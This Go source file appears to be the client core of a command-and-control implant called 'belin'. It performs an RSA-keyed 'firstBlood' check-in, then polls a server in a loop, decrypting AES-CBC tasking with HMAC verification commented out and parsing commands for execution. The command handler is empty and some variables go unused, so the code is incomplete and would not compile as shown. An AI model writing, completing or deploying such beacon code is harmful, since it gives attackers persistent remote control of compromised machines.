package internal

import (
	"belin/config"
	"belin/encrypt"
	"belin/metadata"
	"belin/requester"
	"bytes"
	"encoding/binary"
	"errors"
	"io"
	"log"
	"time"
)

func Init() error {
	enc, err := encrypt.New(config.RSAPUB, config.RSAPRV)
	if err != nil {
		return err
	}

	mt := metadata.New()
	log.Printf("client Id %d", mt.ClientId)

	req := requester.New()

	b, err := firstBlood(enc, mt, &req)
	if err != nil {
		return err
	}

	if !b {
		return errors.New("firstblood not reached")
	}

	log.Printf("firstblood ok")
	time.Sleep(time.Duration(config.SLEP))
	return loop(enc, mt, &req)
}


func loop(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile) error {
	for {
		resp, err := callCommand(mt, r)
		if err != nil {
			return err
		}
		//log.Printf("call home ok st=%d cl=%d\n", resp.StatusCode, resp.ContentLength)
		
		if resp.ContentLength > 0 {
			body, err := io.ReadAll(resp.Body)
			if err != nil {return err}

			//hmacData := body[resp.ContentLength-encrypt.HmacHashLen:]
			data := body[:resp.ContentLength-encrypt.HmacHashLen]
			decData, err := enc.AesCBCDecrypt(data, enc.AesKey)
			if err != nil {return err}
			
			timestamp := decData[:4]
			lenDataB := decData[4:8]
			lenData := binary.BigEndian.Uint32(lenDataB)
			decBuf := bytes.NewBuffer(decData[8:])

			for {
				if lenData <= 0 {break}
				cmdType, data, err := metadata.ParseCmd(decBuf, &lenData)
				if err != nil {return err}

			}

		}
		
		
		time.Sleep(time.Duration(config.SLEP) * time.Millisecond)
	}
}